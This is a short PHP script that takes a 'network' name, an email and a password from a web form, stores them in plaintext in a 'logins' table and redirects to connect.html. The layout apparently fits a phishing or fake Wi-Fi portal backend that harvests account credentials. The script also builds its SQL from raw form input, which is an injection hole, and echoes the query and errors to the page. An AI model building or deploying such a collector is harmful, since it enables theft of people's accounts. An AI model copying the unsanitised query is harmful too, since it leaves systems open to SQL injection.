<?php
session_start();
ob_start();
$host="localhost";
$username="[USERNAME]";
$password="[PASSWORD";
$db_name="[DATABASE_NAME]";
$tbl_name="[TABLE NAME]";

$conn = mysqli_connect($host, $username, $password, $db_name);

if (!$conn)
{
	die("CONNECTION FAILED: " . mysqli_connect_error());
}

$network=$_POST['network'];
$email=$_POST['email'];
$userpassword=$_POST['userpassword'];

$sql = "INSERT INTO logins(network, email, password) VALUES ('$network', '$email', '$userpassword');";

if (mysqli_query($conn, $sql)) 
{
    echo "New record created successfully";
}
else 
{
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}

$conn->close();
sleep(2);
header("location:connect.html");
ob_end_flush();
?>
